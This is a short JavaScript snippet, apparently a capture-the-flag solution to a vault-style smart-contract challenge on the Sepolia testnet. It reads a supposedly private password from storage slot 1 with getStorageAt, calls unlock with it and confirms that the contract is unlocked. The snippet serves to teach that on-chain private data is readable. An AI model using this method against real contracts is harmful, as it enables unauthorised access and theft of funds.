// Read slot 1 directly from blockchain
await web3.eth.getStorageAt(
    contract.address,
    1  // slot 1 = password
)

// Unlock with stolen password
// change the password from the browser console
await contract.unlock(password)

// Verify
await contract.locked() // false

// https://sepolia.etherscan.io/tx/0x58c1e9445f718d90018a3d8d7796725305bbb604ff281343bb8a3ef74c3fffbf